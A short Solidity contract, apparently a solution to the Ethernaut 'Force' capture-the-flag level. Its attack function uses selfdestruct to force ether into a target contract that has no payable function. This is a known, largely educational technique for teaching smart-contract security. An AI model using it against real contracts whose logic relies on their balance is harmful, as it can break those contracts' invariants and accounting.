// SPDX-License-Identifier: MIT
pragma solidity 0.6.0;

contract Force {

    // @info contracts can be deleted from the blockchain by calling selfdestruct
    // @info self destruct sends all the remaining ethers to a specified address 
    function attack(address target) external payable {
        // require(msg.value > 0, " value is < 0");
        // set the smart contract target address to payable
        address payable addr = payable(address (target));
        selfdestruct(addr);
    }

    // @info To recieve Ether in the smart contract
    receive() external payable {}
    
    
    function getBalance() external view returns(uint) {
        return address(this).balance;
    }

}